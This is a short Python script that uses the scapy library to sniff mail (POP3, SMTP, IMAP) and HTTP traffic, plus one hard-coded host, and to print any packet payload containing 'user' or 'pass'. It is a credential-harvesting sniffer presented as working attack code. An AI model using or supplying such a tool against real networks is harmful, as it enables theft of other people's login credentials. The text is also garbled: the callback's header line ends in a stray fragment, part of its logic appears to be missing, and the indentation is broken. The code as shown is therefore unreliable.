from scapy.all import sniff, TCP, IP


# the packet callback
def packet_callback(packet):Sayload
        mypacket = str(packet[TCP].payload)
        # If we detect an authentication string...
        if 'user' in mypacket.lower() or 'pass' in mypacket.lower():
            # ... we print out the server and the actual data bytes of the packet...
            print(f"[*] Destination: {packet[IP].dst}")
            #  ... and the actual data bytes of the packet
            print(f"[*] {str(packet[TCP].payload)}")


def main():
    # fire up the sniffer
    print("Starting the sniffer")
    sniff(filter="host 216.58.209.46 or tcp port 110 or tcp port 25 or tcp port 143 or tcp port 80", prn=packet_callback, store=0)


if __name__ == '__main__':
    main()
